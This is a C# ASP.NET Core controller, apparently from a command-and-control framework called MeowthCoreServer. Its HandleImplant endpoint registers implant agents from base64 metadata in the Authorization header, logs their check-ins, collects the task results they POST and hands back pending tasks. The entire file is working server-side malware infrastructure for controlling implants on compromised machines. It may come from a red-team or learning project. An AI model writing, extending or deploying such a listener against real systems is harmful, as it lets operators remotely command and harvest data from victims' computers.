using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using MeowthCoreServer.Services;
using Microsoft.AspNetCore.Http;
using Newtonsoft.Json;
using System.Text;
using System.IO;

namespace MeowthCoreServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private readonly IAgentService _agents;
        public HttpListenerController(IAgentService agents)
        {
            _agents = agents;
        }
        public async Task<IActionResult> HandleImplant()
        {
            var metadata = ExtractMetaData(HttpContext.Request.Headers);
            if (metadata is null) return NotFound();
            var agent = _agents.GetAgent(metadata.Id);
            if (agent is null)
            {
                agent = new Agent(metadata);
                _agents.AddAgent(agent);
            }
            agent.CheckIn();
            if (HttpContext.Request.Method == "POST")
            {
                string json;
                using (var sr = new StreamReader(HttpContext.Request.Body))
                {
                    json = await sr.ReadToEndAsync(); 
                }
                var results = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);
                agent.AddTaskResults(results);
            }
            var tasks = agent.GetPendingTasks();
            return Ok(tasks);
        }
        private AgentMetadata ExtractMetaData(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
                return null;
            // auth bearer <b64>
            var jsonMetadata = encodedMetadata.ToString().Remove(0, 7);
            var json = Encoding.UTF8.GetString(Convert.FromBase64String(jsonMetadata));
            return JsonConvert.DeserializeObject<AgentMetadata>(json);
        }
    }
}
